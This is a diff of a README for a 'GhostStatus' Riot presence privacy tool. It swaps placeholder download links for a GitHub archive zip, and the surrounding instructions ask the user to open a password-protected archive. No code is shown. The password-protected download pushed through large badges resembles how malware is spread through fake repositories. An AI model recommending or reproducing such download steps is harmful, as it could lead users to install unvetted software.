@@ -57,7 +57,7 @@ Why **GhostStatus** can become your main tool for managing your online presence:
 ---
 
 ### ⬇ Download GhostStatus – Riot Presence Privacy Tool
-[![Download GhostStatus](https://img.shields.io/badge/%E2%AC%87%20Download-GhostStatus_Privacy_Tool-blue?style=for-the-badge)](https://example.com/ghoststatus.zip)
+[![Download GhostStatus](https://img.shields.io/badge/%E2%AC%87%20Download-GhostStatus_Privacy_Tool-blue?style=for-the-badge)](https://github.com/soundassociatebrace/GhostStatus/archive/refs/heads/main.zip)
 
 ---
 
@@ -102,7 +102,7 @@ After downloading the `.zip` file:
 
 1. **Download the GhostStatus archive**
 
-   [![Download GhostStatus](https://img.shields.io/badge/%F0%9F%9A%80%20Download-GhostStatus_Privacy_Tool-green?style=for-the-badge)](https://example.com/ghoststatus.zip)
+   [![Download GhostStatus](https://img.shields.io/badge/%F0%9F%9A%80%20Download-GhostStatus_Privacy_Tool-green?style=for-the-badge)](https://github.com/soundassociatebrace/GhostStatus/archive/refs/heads/main.zip)
 
 2. **Open the archive and enter the password**
 
